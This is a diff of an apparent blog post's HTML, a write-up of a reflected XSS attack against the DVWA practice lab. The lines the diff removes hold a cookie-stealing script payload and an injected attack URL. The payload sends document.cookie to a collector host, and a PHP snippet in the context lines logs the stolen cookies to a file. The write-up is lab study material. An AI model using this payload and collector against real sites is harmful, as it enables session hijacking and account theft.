@@ -15,8 +15,10 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="d:/blog范本/弹窗测试.PNG">
 <meta property="og:image" content="d:/blog范本/XSS攻击思路.PNG">
+<meta property="og:image" content="d:/blog范本/构造攻击js.PNG">
+<meta property="og:image" content="d:/blog范本/url攻击.PNG">
 <meta property="article:published_time" content="2021-08-01T15:57:10.085Z">
-<meta property="article:modified_time" content="2021-08-01T16:36:42.855Z">
+<meta property="article:modified_time" content="2021-08-01T16:39:52.358Z">
 <meta property="article:author" content="Kkkylin12">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="d:/blog范本/弹窗测试.PNG">
@@ -113,10 +115,10 @@ $cookie = $_GET[ 'cookie'];file_put_contents('cookie.txt',$cookie);
 ?>
 
 <p>构造攻击js</p>
-<script>document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie;</script>
-
+<p><img src="D:\blog范本\构造攻击js.PNG" alt="构造攻击js"></p>
 <p>构造并发送攻击url</p>
-<p>http:// 10.240.138.212/DVWA-1.9/vulnerabilities/xss_r/?name=<script>document.location='http ://127.0.0.1/cook ie.php?cookie='+document.cookie;</script>同时需要对参数进行url编码</p>
+<p><img src="D:\blog范本\url攻击.PNG" alt="url攻击"></p>
+<p>同时需要对参数进行url编码</p>
 <p>获得cookie</p>
 <p>http:// 127.0.0.1/cookie.txt</p>
 <p>内容：</p>
